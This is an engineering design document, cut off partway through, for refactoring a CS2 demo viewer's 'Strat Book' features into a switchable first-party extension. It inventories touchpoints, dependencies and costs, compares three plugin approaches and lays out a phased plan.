# Strat Book as a plugin: investigation and design

Status: investigated 2026-10-02 on `spike/strat-book-plugin` (off `feature/strat-book` at `8275d5a6`);
decisions recorded 2026-10-02 (section 10). Line numbers are against that commit and will drift.

Goal: make the Strat Book features a plugin that a user can fully disable, extend the plugin
framework where the Strat Book needs seams it does not have, and grow the existing feature hiding into a
modular application.

**Naming.** `docs/plugins/plugin-system-design.md` already reserves "plugin" for the CSVG game plugin that
live sync installs into CS2, and uses "add-on" for third-party code. This doc says **feature pack** for a
first-party, compiled-in unit that can be switched off as a whole, and "the Strat Book pack" for this one.
Users see it as an **extension** ("Strat Book extension"), decided 2026-10-02 (section 10).

---

## 1. Summary

- **Hiding is not off.** Every Strat Book surface can be hidden today, live, through `tab.*` feature ids.
  None of those gates stops any background work. Round Facts runs on every library index with no switch at
  all, Round Index runs by default, two indexes load at startup and stay resident, and Team Identity
  rebuilds at startup and constructs the strat, dossier and veto stores as it does. The first deliverable
  is making "off" mean off. It is also the cheapest.
- **The module framework already carries most of the UI.** All eight Strat Book modules are ordinary
  `IWorkspaceModule`s, and the branch already added the hosted-section idea (`TabPlacement.StratBook` and
  `.Library`, `TabSectionHost`). What it lacks is a pack level (an umbrella id, contribution lists the shell
  enumerates instead of hardcoding) and seams inside 2D Playback, where the Strat Book, Round Tagger,
  Suggested Tags and Situations are wired directly into `Playback2DTabViewModel`.
- **Recommendation: option (a), in-process packs behind an expanded contribution model, laid out so the
  later move to a separate assembly (b) is mechanical.** Option (c), runtime-loaded plugins, is ruled out
  for the Strat Book by the add-on design's own rule: 33 Strat Book files reference CS2DemoKit, and add-ons
  must never do so.
- **Structure (decision 5, 2026-10-02):** every extension lives in its own directory now and becomes its
  own csproj as soon as the core-to-extension edges are cut, so an extension can ship on its own cadence.
  Section 13 gives the layout, phases 5 and 6 the project split and the independent release.
- **Effort:** 25 items for (a) across five phases (0 to 4), then 8 for the project split
  (Phase 5, now required) and about 6 for the independent release (Phase 6). Phase 0 (contracts and the pack
  skeleton) unblocks parallel work; Phase 1 (real "off", in-session release, first-run prompt) ships value
  on its own. Items in section 6, the build order in section 11.

---

## 2. What exists today

### 2.1 Module and tab framework

- `IWorkspaceModule` (`Modules.Abstractions.Ui/IWorkspaceModule.cs`): `Id`, `DisplayName`,
  `ContractVersion` (written, never read), `CreateTabs(IModuleHost)`.
- `WorkspaceTabDescriptor`: `TabId`, `Header`, `Badge` (added on this branch), `Order`, `Placement`, a lazy
  retained `ViewModelFactory`, a per-activation `ViewFactory`, and `PendingRestoreState` for lazy session
  restore. The view is dropped on deactivation; the VM is kept.
- `TabPlacement` gained `StratBook` and `Library` on this branch: a descriptor with those placements is a
  section hosted inside another tab, not a strip tab. `TabSectionHost` (`ViewModels/Shell/TabSectionHost.cs`)
  reconciles sections by identity on every gate change, so a section VM survives a flip.
- `ModuleRegistry` is a plain list. `App.BuildRegistry` (`App.axaml.cs:1511-1576`) news up every module by
  hand: Playback2D, RuleWorkbench, Highlights, then the eight Strat Book modules. `BuiltInTabsModule` is
  registered by the shell.
- `IModuleContext` is the read-only runtime surface. The branch added `DemoSha256`, `FirstTick` and
  `LastTick` as default members. The concrete `ModuleContext` also carries first-party hosts that are
  deliberately off the interface: `ExportHost`, `StratExportHost`, `StratCaptureHost`. Consumers reach them
  by downcasting (`_context is ModuleContext { StratCaptureHost: ... }`, five sites).
- `ModuleHost` capabilities are cosmetic (no enforcement; see the add-on doc §1.1). Unchanged here.

### 2.2 Feature gating

- `FeatureCatalog` is a static list of `FeatureDescriptor(Id, Scope, Label, Description, ParentId, GroupId,
  Required, Defaults)` with scopes `Tab`, `SubFeature`, `Chrome` and per-category defaults (consumer, power,
  developer). `FeatureGate` resolves Required, then override, then category default, then group leader,
  then parent cascade. It reads `IOptionsMonitor<AppSettings>` live and raises `Changed` on the UI thread.
  An id not in the catalog fails open.
- `MainViewModel._tabFeatureIds` (`MainViewModel.cs:94-115`) is a hardcoded map from tab id to feature id.
  A tab not in the map is always shown.
- `ShellModuleFeatureGate` projects the gate to modules as `IModuleFeatureGate` and ANDs in desktop-only ids
  (`stratbook.export` is one).
- Strat Book ids: tabs `tab.stratbook`, `tab.situations`, `tab.tagger`, `tab.utilitybook`, `tab.review`,
  `tab.dossier`, `tab.suggested`, `tab.teams`; sub-features `stratbook.export`, `stratbook.routing`,
  `playback2d.tagger`, `playback2d.suggestedtags`. All default on for every category. **There is no umbrella
  id.** The hub tab `stratbook.hub` is shown when any section resolves on.
- Gating is live for UI. It stops work in exactly one place: `SuggestedTagsService` takes
  `() => features.IsEnabled("playback2d.suggestedtags")` and its `Wants()` returns false when off. That is
  the precedent for section 7.

### 2.3 Plugins and extension

There is no loader: no `AssemblyLoadContext`, no assembly scanning, no MEF. `docs/plugins/plugin-system-design.md`
(rev. 2, 2026-08-20) is the design of record for third-party add-ons and recommends in-process,
full-trust, desktop-only, loader-last. Its findings apply here unchanged and are not repeated: collectible
ALC unload is best effort and likely defeated by `AvaloniaProperty.Register`; add-ons live under the config
root because Velopack replaces `current/`; add-ons must not reference CS2DemoKit; WASM cannot load
assemblies. `CS2DemoKit.Analysis.Plugins` is a namespace, not a mechanism.

### 2.4 Distribution

- Desktop publish is untrimmed, non-AOT, non-single-file, by recorded decision. Velopack per RID.
- The Browser head (`DemoViewer.NET.Browser`) references the whole app assembly and runs the same
  `App.BuildRegistry`; it is untrimmed too (`PublishTrimmed=false`, with the reasons in its csproj) and is
  now built by the `wasm-build` CI job. Every Strat Book module is registered on both hosts and degrades to
  session-only state in the browser.
- Consequence: nothing in the build blocks any of the three options on desktop. Trimming would only matter
  if it were turned on later, and then a pack in a separate assembly would need to be rooted explicitly.

---

## 3. Touchpoint inventory

**Rings.** Each touchpoint is placed in one of three rings, because the answer to "can it be a plugin
contribution" depends on which ring it is in.

- **P (pack-owned):** exists only for the Strat Book; disappears with it.
- **S (shared):** added by the Strat Book work but now consumed by core features. Disabling the pack must
  not remove it, or must replace it with a degraded path. Where the boundary sits is question 1.
- **G (generic):** a reusable capability the work added to core (lanes, shape tools, `MapSceneHost`,
  `QueueWork`, zones). Stays in core regardless.

"Expressible" means the current framework can carry it as a contribution with no new seam.

### 3.1 Tabs, sections, shell

| Touchpoint | Ring | Attaches today | Expressible? | Seam needed |
|---|---|---|---|---|
| Strat Book hub tab `stratbook.hub` | P | Shell synthesizes the descriptor when any `Placement=StratBook` descriptor exists; `new StratBookHubView()` and `StratBookHubViewModel` referenced from `MainViewModel` (:532, :2409-2435) | Partly | Hosts as contributions: a pack declares a host tab, sections target it by host id instead of an enum member |
| Sections: Strats, Situations, Tags, Utility, Review, Dossier, Suggested | P | One `IWorkspaceModule` each, `Placement=StratBook`, hardcoded `Register` in `BuildRegistry` | Yes, mostly | Pack registration instead of the hardcoded list; feature ids declared by the module instead of `_tabFeatureIds` |
| Teams under Library | S | `TeamsModule`, `Placement=Library`; `LibraryTabViewModel.Sections` | Yes (section) | Same as above. The Library's team filter and provenance chip are not sections (next row) |
| Library team filter, provenance chip | S | `MainViewModel` and `LibraryTabViewModel` ctor take `TeamIdentityService`, `IDemoProvenanceSource`; XAML in `LibraryTabView.axaml` | No | Library filter and card-badge contributions |
| `StratBookLayout` (collapsed rail and list) | P | DI singleton passed to `BuildShell`, shared by hub and Strats VM | No | Pack session state (3.6) |
| Strat export status chip | P | `MainViewModel.AttachStratExportStatus` (:2275-2339), its own chip slot | No | Status-chip contribution |
| Cross-pack navigation (`TrySelectTab(StratBookModule.BrowserTabId)` then `OpenStrat(id)`) | P | Lambda in `App.WireStratCapture` (:492-509) | No | Navigation by URI-like route (`stratbook/strat/{id}`) owned by the pack |
| Shutdown flushes | P/S | `App` :312-316: `StratBookModule.Shutdown`, `TagStore.SaveIndex`, `ReviewQueue.Flush`, `GrenadeIndex.FlushLineups` | No | Pack lifecycle `OnShutdown` |
| Feature ids | P | Static `FeatureCatalog`, hardcoded `_tabFeatureIds` | No | Pack-declared descriptors, a pack scope, umbrella id |

### 3.2 Library, indexing, processing queue

| Touchpoint | Ring | Attaches today | Runtime cost when "hidden" | Expressible? | Seam needed |
|---|---|---|---|---|---|
| Evaluator list | P/S | Hardcoded `[library, highlights, roundFacts, roundIndex, suggestedTags, grenades]` and a hardcoded pending-path union (`App.axaml.cs:1313-1340`); order pinned by `AppCompositionRootTests` | n/a | No | Ordered evaluator registry with `After` constraints; each evaluator gated |
| Round Facts | **S** | `RoundFactsEvaluator`; the `round_facts` ruleset is merged into `MergedRulesBuild`, so it runs inside every Library and Highlights forward pass; `AnalysisViewModel` excludes it; `RoundTrack` uses it for winner tints | Runs on every index and every open. No switch | No | Decide ring (Q1). If pack: ruleset contribution to `MergedRulesBuild`, `RoundTrack` tint via an optional source |
| Round Index and `SituationIndex` | P | `RoundIndexEvaluator.Wants` gated on `Situations.BackgroundIndex` (default **true**); `SituationIndex.Load` at startup (:1376), resident, subscribes to `DemoCacheStore.Changed` | Background parse work per demo; resident index | No | Gated evaluator, pack startup load |
| Grenade Index (Utility Book) | P | `GrenadeIndexEvaluator` (`Grenades.BackgroundIndex`, default false, but the open demo is always walked); `GrenadeIndex.Load` at startup (:1379), resident; `LineupClipService` force-resolved (:1382); `GrenadeStoreMigration` queued at 30 s (:1402); Match Overview "Index grenades" wired at :206-211 | Walk on every open, resident index, migration | No | Gated evaluator, pack startup, pack migrations, Match Overview action contribution |
| Suggested Tags | P | `SuggestedTagsService` (gated on `playback2d.suggestedtags` and `SuggestedTagsBackground`, default false); `SuggestedInboxModule` badge recomputes on every `cache.Changed` | Off when its gate is off; badge sum on every cache change while registered | Partly (the precedent) | Same pattern for the rest |
| Strat Mining | P | `StratMiningService` built lazily with the Strats VM; once mined, re-mines after 30 s of cache quiet | Only after first use | Mostly | Pack-gated, and unsubscribe on disable |
| Team Identity, Provenance | **S** | `TeamIdentityService.StartAsync()` at startup (:1385); its factory resolves `StratStore`, `DossierNotesStore`, `VetoHistoryStore`; Provenance overrides live in `teams.json` | Startup rebuild or diff; three pack stores constructed eagerly | No | Split "referenced teams" reporting into a contribution so Teams does not pull pack stores |
| `TagFactsRefresher` | P | Force-resolved at startup (:1387), saves on every Round Facts update | A `StoreSave` job per update | No | Pack startup |
| Queue job kinds | G/P | `QueueJobKind` enum gained `StratMining`, `StratPreview`, `LineupClips`, `SuggestionsInbox`, `SectionCompute`, `TeamsCommand`, `StoreSave`, `StoreLoad`, `PackExport`; `KindRank`, `IsLight` and `DemoQueueRowViewModel.KindLabel` switch on them | None | No | Job kind descriptors (label, rank, light) registered, enum kept for core kinds |
| Demo cache schema | **S** | `DemoCacheModels.cs` imports `Services.RoundFacts` and `.RoundIndex` and embeds about 13 Round Facts, Round Index, Suggestions and Grenade fields, mirrored on the index entry | ~50 B per index row | No | Opaque per-pack payloads keyed by pack id (3.6). No schema bump needed to drop fields: the store ignores unknown members |
| SHA-256 per demo at tier 2 | S | `DemoLibraryService.GetOrComputeSha` for the tag and annotation stores | A second full read per indexed demo | No | Compute on demand, or keep (annotations need it too) |
| Highlights to Review Queue | S | `HighlightsTabViewModel` takes `ReviewQueue` (:816) | None | No | Optional "send to review" contribution on the Reels tray |

### 3.3 2D Playback

| Touchpoint | Ring | Attaches today | Expressible? | Seam needed |
|---|---|---|---|---|
| Create Strat From Round (round-band right-click) | P | Hardcoded `MenuItem` in `TimelineControl.OnBandPressed` (:97-131); `CanCreateStrat`, `RequestCreateStrat`, `CreateStratRequested` on the timeline VM; tab VM downcasts to `ModuleContext` for `StratCaptureHost` (:570) and builds `CreateStratDialogViewModel` (:1040-1105) | No | Band context-menu contribution plus a side-pane contribution (section 5.4) |
| Create Strat review pane | P | `Playback2DView.axaml:525-540` binds `CreateStratDialog` | No | Side-pane contribution |
| `StratCaptureHost`, `StratExportHost` on `ModuleContext` | P | Concrete properties set by `App`; `ModuleContext.cs` imports `Modules.StratBook` | No | Typed service lookup on the context (`IModuleContext.GetService<T>`) or pack-owned host |
| Review mode, tag lane, proposal lane | P | Tab ctor registers `TagTrack` and `ProposalTrack` via `Timeline.RegisterTrack` (a real list seam), but band clicks dispatch on `TrackId` in the tab, and `LaneMenu` is a single `Func` slot | Lanes yes, behaviour no | Lane contribution that carries its own press and menu handlers |
| Tag Palette, Tag Editor, Suggestion Queue, Review panel | P | Tab VM constructs `TagPaletteViewModel`, `SuggestionQueueViewModel`, `ReviewPanelViewModel`; services by `App.Services` service locator (`TryResolve<T>`); views embedded in `Playback2DView.axaml` right column (:551-760) | No | Right-column panel contribution with order, gate and focus scope |
| Click To Tag Position | P | `Scene2DHost.OnPointerPressed` calls `ISceneFrameHost.TryTagPositionAt` before the tool router | No | Pointer pre-handler contribution, or a tool |
| Keymap actions | P/G | Closed `Playback2DAction` enum and static default table gained Tag*, Suggestion*, ToggleReviewMode, FindRoundsLikeThis, situation result nav, ToolToken, step add/duplicate/delete/nav; scopes `WhenPaletteFocused`, `WhenSuggestionSelected` | No | String-keyed command ids with defaults, registered by the pack (section 5.9) |
| "Rounds like this" button and menu | P | `Playback2DView.axaml:294, :322`; `IFindRoundsLikeThis` | No | Toolbar and menu contribution |
| Lineup picker | P | Lives in the Strat Book (`LineupPickerView`), hosts `UtilityMapHost : MapSceneHost` | Yes (inside the pack) | None, if `MapSceneHost` is reachable |
| Token editor, guides layer | P | **Moved (item 26).** `TokenTool`, `GuideLayer` are in the extension (`Playback2D/Input`, `Playback2D/Layers`); `ITokenEditor`, `TokenGrip`, `TokenHitTest` stay core (`IToolServices.Tokens` needs the interface type with the pack off). `Scene2DHost.AddTool`/`AddLayer` register them once, called by `StratCanvasView`'s constructor; the 2D Playback tab's host calls neither | None left; the router's Token fallback still reads the registration by key, not by type |
| Keyframes, routes, route palette | P/G | **Keyframes moved (item 26):** `StepSchedule`, `TokenKeyframe`, `TokenTrack*` are in the extension, namespace unchanged (nothing in Core referenced it). `StratFrameSource`, `StratSceneSpec`, `StratHudDataSource` moved too, into an extension-owned namespace (`Pipeline.Frames`/`.Hud` keep `TrackerFrameSource` and friends behind). **`TokenRouteLine`, `Scene2DFrame.Routes`, `ScenePalette.Route*` stay, because:** `MarkerLayer` (core) draws `Scene2DFrame.Routes` unconditionally and `SceneFixtureSerializer` (pipeline) round-trips it in every golden fixture, pack or no pack; moving the type would make two core/pipeline files reference the extension |
| Zones, shape and text tools, `MapSceneHost`, `ISceneFrameHost`, `RegisterTrack` | G | Core and app | n/a | Stay core. **Done (item 26):** `ISceneFrameHost` lost `TokenEditor` and `Guides` into `ITokenEditingHost`/`IGuidesHost`, optional interfaces `SceneHostToolServices`/`Scene2DHost` type-test for; `TryTagPositionAt` was already folded into `TryPointerPreHandler` by item 20 |
| Export dialog reuse (`ExportDialogScene`) | G | Strat Book reuses `Playback2DExportDialogViewModel` | Yes | None |

### 3.4 Situations, Dossier

Both are sections (3.1) with their own services. Situations adds three things outside its section:
`IFindRoundsLikeThis` and `ISituationResultWalk` used by 2D Playback (3.3), `WatchedSituationsService`
resolved eagerly by `BuildRegistry` (for the badge), and the startup `SituationIndex` load (3.2). Dossier
news up its analysis services inside its lazy VM factory and costs nothing until opened, apart from
`DossierNotesStore` and `VetoHistoryStore`, which Team Identity's factory builds at startup.

### 3.5 Settings, theme, UiCapture, CLI

| Touchpoint | Ring | Attaches today | Expressible? | Seam needed |
|---|---|---|---|---|
| Settings sections | P | `SettingsView.axaml` hardcoded XAML: Suggested Tags tuning section (~:314-400), grenade toggles (~:888-920); `SettingsViewModel` ctor takes `SuggestedTagsTuningViewModel`; hardcoded search keywords | No | Settings page contribution |
| `AppSettings` sections | P | `Situations`, `Grenades`, three `Playback2D` keys; `SettingsService` flattening at :504-517 lists keys by hand; `AppSettings` imports `RoundIndexTokenSource` | No | Pack settings section bound by key (`Packs:StratBook:*`) or kept where it is (cheap, harmless) |
| Theme tokens | P | `ModalScrim`, `Pb2dCanvasRoute{T,Ct,GhostT,GhostCt}`, `Pb2dCanvasDropTarget` in `DarkPalette.axaml` (both dictionaries), three in `01-high-contrast.json`; `Button.pane-toggle` in `Primitives.axaml` | Effectively yes | None. Tokens cost nothing when unused. Keep them in core; a pack token manifest is only needed for (c). Doc drift: `theme-token-catalog.md` lacks `RouteGhost*` and `DropTarget` |
| UiCapture variants | P | 30 `strat-*` keys in the hardcoded dictionary in `Variants.cs` (:232-262), implementations in partial files | No | Variant registration per pack (a static `IUiCaptureVariantSource` list), needed only for (b) |
| CLI | G | `Playback2D.Cli` gained `pack` (Review Queue packs) and `--zones-overlay`, `--query`, `--overlay`. No strat command. `AnalysisBench bg-run` compile-links `ForwardDemoPass.cs` and names `round_facts` | n/a | None for (a). Under (b), `pack` moves with the Review code |
| Embedded resources | P | `Services/Tags/Palettes/*.tagpalette.json`, `Services/Strats/Callouts/*.places.json` in the app csproj | n/a | Move with the assembly under (b) |
| `PlaceField` control | P | `Controls/PlaceField*` depends on `CalloutResolver` | n/a | Move to the pack |

### 3.6 Session, stores, caches

| Touchpoint | Ring | Attaches today | Seam needed |
|---|---|---|---|
| `SessionPayload.StratBook` (`StratBookLayoutState(RailCollapsed, ListCollapsed)`) | P | **Done (item 23).** `SessionPayload.Packs: Dictionary<string, JsonElement>?`, keyed by pack id; `StratBookLayoutState` moved to `Extensions/StratBook/`. `IHostTabViewModel.SessionPackId`/`SnapshotPackState`/`RestorePackState` (§7.4 as built), read/written in `MainViewModel.RestoreSession`/`SnapshotSession`/`ApplyGateChange` over `_hosts`, gated per host on `host.Tab.FeatureId`. A pre-`Packs` file's top-level `StratBook` folds once via `IJsonOnDeserialized`. A pack never enabled this session carries its blob through unread and unwritten (`_loadedPackSessions`); one enabled at startup or by a live toggle (`_restoredPackIds`) is snapshotted from its live value even after a later disable | none |
| Active tab id persisted as a section id (`stratbook.browser`) | P | `PersistedActiveTabId` | `TrySelectTab` already returns false for a section whose host is gone (`MainViewModel.cs:3644-3655`); restore must then land on Library |
| Config-root stores | P/S | `strats/`, `tags/`, `palettes/`, `suggested-tags/`, `lineup-clips/`, `teams.json`, `review-queue.json`, `watched-situations.json`, `veto-history.json`, `dossier-notes.json`, `strat-mining.json`, `grenade-lineups.json.gz`, `grenades-v3.attempts.json` | None to keep. Pack store registration only matters for "delete my data" (section 7) |
| Cache-root data | P/S | `cache/round-index/*.dvri.json`, `.dvrp.json.gz`; `cache/suggestions/`; `cache/strat-mining/{detected.json, signatures.json.gz}`; `cache/team-index.json`; demo sidecars `.grenades*.json.gz`; fields inside the demo cache record | Opaque pack payloads in the cache record (P4) |

### 3.7 DI

About 50 singleton factory registrations in `App.BuildServices` (:690-1290) for Strat Book types, all
inline in one method, plus the explicit startup force-resolves listed in 3.2. The comment above
`BuildServiceProvider` says `ValidateOnBuild` constructs every singleton. MS.DI validates call sites and
does not invoke factories, so the startup cost is the explicit list at :1373-1402, not every registration.
That is good news: moving the registrations into a `StratBookPack.Register(services)` costs nothing at
runtime, and gating the explicit list is what removes the startup cost.

---

## 4. Dependency map

### 4.1 Core to Strat Book (the edges to cut)

```
App.axaml.cs ............ everything (composition root; expected, becomes Pack.Register calls)
MainViewModel ........... StratBookHubViewModel, StratBookHubView, StratBookLayout(State),
                          TeamIdentityService, IDemoProvenanceSource, strat export chip
ModuleContext ........... StratCaptureHost, StratExportHost   (imports Modules.StratBook)
Playback2DTabViewModel .. ~25 types: StratBook (7), RoundTagger (~10), SuggestedTags (4),
                          Situations (2), Teams (3), RoundFacts; via downcast + App.Services locator
Playback2DView.axaml .... RoundTagger and SuggestedTags views embedded
TimelineControl ......... "Create strat from this round" menu item
Playback2DKeymap ........ strat, tag, suggestion, situation actions in a closed enum
RoundTrack .............. RoundFacts (winner tints)
LibraryTabViewModel ..... TeamIdentityService, IDemoProvenanceSource, TeamFilterItem
HighlightsTabViewModel .. ReviewQueue
AnalysisViewModel ....... RoundFacts, RoundFactsFingerprint
MergedRulesBuild ........ round_facts ruleset, RoundFactsFingerprint
RuleWorkbenchTabVM ...... ZoneOverlayDiagnostics          (Zones: generic, fine)
DemoCacheModels ......... RoundFacts*, RoundIndexState, RoundIndexFingerprint
AppSettings ............. RoundIndexTokenSource
SettingsViewModel/View .. SuggestedTagsTuningViewModel, grenade toggles
UiCapture ............... Strat* variants
Playback2D.Pipeline ..... declares namespace DemoViewer.NET.Services.Review (ReviewQueueModels)
```

The heavy knot is `Playback2DTabViewModel`, and most of it is the Round Tagger and Suggested Tags, not the
Strats section. Only the Create Strat path, `ModuleContext`, `MainViewModel`'s hub and the keymap carry
Strats-specific types.

### 4.2 Strat Book to core (what a pack contract must offer)

Occurrences across the Strat Book folders: `DemoCacheStore` 144, `QueueWork` 28,
`WorkspaceTabDescriptor` 26, `IModuleContext` 17, `QueueJobKind` 14, `IDemoProcessingQueue` 8,
`IDemoEvaluator` 7, `MergedRulesBuild` 6, `FrameClock` 5, `Scene2DHost` 4, `MapSceneHost` 4,
`ModuleContext` (concrete) 3, `IFeatureGate` 3, `DemoEvaluationCoordinator` 3, `AppPaths` 3, `App.Services`
3 (all in `StratCanvasViewModel`), `ISceneFrameHost` 2. Plus Playback2D Core and Pipeline wholesale, and
CS2DemoKit in 33 files (Round Facts, Round Index, Utility Book, capture, Suggested Tags). No Strat Book
code references `MainViewModel` or `DemoLibraryService`; it reaches the shell only through lambdas.

### 4.3 What this means

The reverse edges (4.2) are broad but healthy for options (a) and (b): they are app services a pack in the
same process can be handed. The forward edges (4.1) are the work. They are finite, about fifteen files, and
cluster in four places: the composition root, the shell, 2D Playback, and the demo cache record.

---

## 5. Options

### (a) In-process feature packs, compiled in, expanded contribution model

Every Strat Book module stays in `DemoViewer.NET.dll`. A `StratBookPack` class owns its DI registrations,
modules, evaluators, startup work, settings pages and 2D Playback contributions, and the shell enumerates
packs instead of hardcoding them. One umbrella feature id, with the existing per-section ids under it.

- **Effort:** 24 items (section 6). Phases 0 and 1 (real "off", with in-session memory release) are 10.
- **Risk:** low. No new loading, no type-identity problems, no XAML resource resolution across assemblies.
  The main risk is regression in 2D Playback while inverting its dependencies, which has good headless
  coverage (`Playback2D*Tests`, `SceneLayerListParityTests`, follow-card render tests). User-facing risk:
  none, the feature works the same when on.
- **Performance and memory:** when on, identical. When off: no Round Index or Grenade walks, no
  `SituationIndex` or `GrenadeIndex` resident, no Team Identity rebuild, no tag-facts saves, no mining. If
  Round Facts goes into the pack (Q1), the `round_facts` rules also leave every forward pass. Code pages
  for the pack stay mapped (it is in the same DLL), which is a few MB of IL and JIT only for what runs; JIT
  cost is zero for code never called. No measurement exists yet for the resident indexes; see section 9.
- **UX when disabled:** the Strat Book tab, Teams view, Library team filter and provenance chip, 2D
  Playback tag palette, suggestion queue, review mode, tag and proposal lanes, Click To Tag, "Rounds like
  this", Create Strat, strat keybinds in the settings list, the Suggested Tags tuning settings, and the
  grenade index toggles all disappear. Data stays on disk. Queue shows no Strat Book job kinds.
- **Testing:** a new matrix axis, pack on and off. One composition-root test per state (what resolves,
  which evaluators register, which startup loads run), plus a "pack off" headless render of 2D Playback.
  Existing tests keep running with the pack on.
- **WASM:** unchanged; the browser gets the same pack registrations and the same switch.

### (b) Separate assembly, loaded at startup, shipped together

`DemoViewer.NET.StratBook.dll` referenced by the heads (or by the app with a project reference reversed via
an interface assembly), registered through the same pack contract. Still one installer, one version.

- **Effort:** (a) plus about 8 items. The blockers are concrete: `ISceneFrameHost`, `Scene2DHost`,
  `MapSceneHost`, `QueueWork`, `DemoCacheStore`, `QueueJobKind`, `MergedRulesBuild` and friends are app
  types the pack would consume, so either they move into a shared `DemoViewer.NET.Core` assembly or the
  pack keeps referencing the app assembly (which only works if the app does not reference the pack, so
  heads compose both). Five downcasts to `ModuleContext` and three `App.Services` uses must go first.
  Avalonia XAML in a second assembly is fine (compiled bindings, `avares://` URIs per assembly); the
  reflection `ViewLocator` needs to search the pack assembly. Strat-only types in Playback2D Core and
  Pipeline (`Keyframes/`, `StratFrameSource`, `StratSceneSpec`, `StratHudDataSource`, route palette,
  guides, token tool) should move out with it or stay as neutral core.
- **Risk:** medium. Mechanical, but wide; touches 144 `DemoCacheStore` call sites indirectly through the
  namespace move, and the UiCapture and test projects need new references.
- **Performance and memory:** same as (a) when off, plus the pack assembly is never loaded if the heads
  register it conditionally. That saves the mapped image and type loads, a few MB at most. Startup is
  unchanged.
- **UX:** same as (a). The only user-visible difference would be a smaller download if a build without
  the pack were ever published, which nothing asks for.
- **Testing:** the boundary becomes compile-enforced: core cannot accidentally take a new dependency on
  the pack. That is the real value of (b). Decision 5 makes (b) the target: (a) is the path to it.

### (c) True runtime plugins (AssemblyLoadContext, third-party capable)

- **Ruled out for the Strat Book.** The add-on design requires add-ons never to reference CS2DemoKit,
  because the family has no cross-version compatibility contract. 33 Strat Book files reference it
  (Round Facts, Round Index, Utility Book grenade walking, Create Strat capture, Suggested Tags). Hiding
  that behind `IModuleContext` would mean promoting a large slice of parsed-demo access into the public
  contract, which is the opposite of that doc's direction.
- Everything else from the add-on doc applies: collectible ALCs are best effort and probably pinned by
  `AvaloniaProperty.Register`, so runtime unload is not a dependable "off"; Windows DLL locking forces
  stage-and-restart; Velopack means add-ons live under the config root; full trust means consent UX and
  signing; WASM cannot load assemblies at all, so the browser would lose the Strat Book.
- **Memory when off:** a not-loaded ALC costs nothing, which is the only advantage over (b), and it is
  available from (b) too by not registering the assembly.
- **Effort:** (b) plus the add-on doc's Phases 1 to 3, several times (b). Value for this request: none
  that (b) does not already give.

### Comparison

| | (a) packs in-process | (b) separate assembly | (c) runtime plugin |
|---|---|---|---|
| Real "off" (no UI, jobs, indexing) | Yes | Yes | Yes |
| Memory when off | Indexes and services gone; IL mapped | Same, assembly not loaded | Same |
| Live toggle without restart | Yes, with in-session release (item 8) | Same | Unload unreliable; restart |
| Boundary enforced by compiler | No (analyzer or test can approximate) | Yes | Yes |
| WASM | Works | Works | Lost |
| Effort (items) | 24 | ~32 | far more, blocked on CS2DemoKit rule |
| Risk | Low | Medium | High |

---

## 6. Recommended path

Do (a), and keep every new seam shaped so that (b) is a move rather than a redesign. Each item below is
sized for one branch and one commit set. Item ids are stable; section 11 gives the build order. Phase 0 exists so
that the rest can run in parallel: once the contracts and the pack class are in, later items edit the pack
and small, separate seams instead of all queueing on `App.axaml.cs`.

### Phase 0: contracts, the pack skeleton and the directory (2 items, plus the baseline measurement)

0. **Contracts and `StratBookPack`.** `IFeaturePack`, `IPackLifecycle`, `IPackContributions` (section 7;
   only `Module`, `Evaluator` and `JobKind` need bodies now, the rest can be added by the item that first
   uses them), `FeatureScope.Pack`, the catalog accepting pack-contributed descriptors (static core plus
   pack lists, immutable after composition), the rule that a `pack.*` id never fails open, and the rule
   that a `Tab` may have a `Pack` parent. `StratBookPack.Register` moves the ~50 registrations out of
   `App.BuildServices` unchanged; `StratBookPack.Features` lists every Strat Book id (3.1, 3.2) with
   `ParentId = "pack.stratbook"`; `BuildRegistry` asks each pack for its modules. Behaviour is identical
   when on. Test: the composition root resolves the same services and modules as before, and
   `IsEnabled("pack.stratbook")` false cascades every section off and hides the hub.
   0b. **One directory per extension.** Move every Strat Book file under
   `src/App/DemoViewer.NET/Extensions/StratBook/` (section 13), tests under
   `DemoViewer.NET.App.Tests/Extensions/StratBook/`, UiCapture variants under
   `DemoViewer.NET.UiCapture/Extensions/StratBook/`. Pure `git mv` plus csproj globs; namespaces and
   behaviour unchanged, so the diff is renames only and `git log --follow` keeps every file's history.
   Runs alone after item 0, before every later item, because it touches every file the later items edit. The
   csproj split (Phase 5) then moves that one directory up to `src/Extensions/`.
   M0. **Baseline measurement.** On a copy of the demo library (never the live config dir): resident set
   after startup, and library index time, at the current head with everything on. Record the numbers in
   section 12 of this doc. Runs alongside item 0; it is the only heavy parse at the time.

### Phase 1: "off" means off (9 items)

1. **Gate the evaluators.** Thread `Func<bool> enabled` into `RoundIndexEvaluator`,
   `GrenadeIndexEvaluator` and `StratMiningService`, the `SuggestedTagsService` pattern; reparent the
   Suggested Tags id. `Wants()` and `PendingPaths()` return nothing when off; opportunistic hooks (the
   grenade walk on open, mining after cache quiet, the inbox badge) return early and unsubscribe.
2. **Round Facts into the pack (decision 1).** Exclude `round_facts` from the highlights fingerprint
   (`MergedRulesBuild.Fingerprint`; it already has `RoundFactsIdentity`), make `MergedRulesBuild` take the
   ruleset as a pack contribution so it leaves every forward pass when off, gate `RoundFactsEvaluator`,
   and make `RoundTrack` draw without winner tints and `AnalysisViewModel` not assume the ruleset. Bench
   A/B with `AnalysisBench --retained`, interleaved, on Library and Highlights passes; the goldens must
   not move with the pack on.
3. **Startup and shutdown through the lifecycle.** `StratBookPack`'s `IPackLifecycle.OnEnabledAsync` runs
   the loads that `App.axaml.cs` lists today (`SituationIndex`, `GrenadeIndex`, `LineupClipService`,
   `TeamIdentityService.StartAsync`, `TagFactsRefresher`, the sidecar and grenade migrations) and
   `OnShutdown` does the flushes with a "was built" check, so shutdown never constructs a store. The app
   calls the lifecycle only when the pack resolves on. `BuildRegistry` stops resolving
   `WatchedSituationsService` and `ReviewQueue` eagerly (the badge subscribes lazily).
4. **Shared surfaces under the pack id.** The Library team filter, provenance chip and Teams section
   (decision 1), the strat export status chip, and the hub all go when `pack.stratbook` is off; session
   restore lands on Library when the persisted active tab is a pack section. Visibility only; the
   contribution seams come in items 12 and 22.
5. **Settings.** One master switch labelled "Strat Book extension" (decision 4) with the per-section and
   sub-feature switches beneath it; the Suggested Tags tuning and grenade sections sit under it; search
   keywords; and the "N demos will be re-indexed in the background" notice when turning on (section 8).
   Note: `FeatureGate.HiddenCount` iterates every catalog row, the `Pack` row included, so a user who
   turns the extension off counts it as one hidden feature plus its tabs.
6. **First-run prompt (decision 2).** `FirstRunWizardViewModel` asks whether to turn the Strat Book
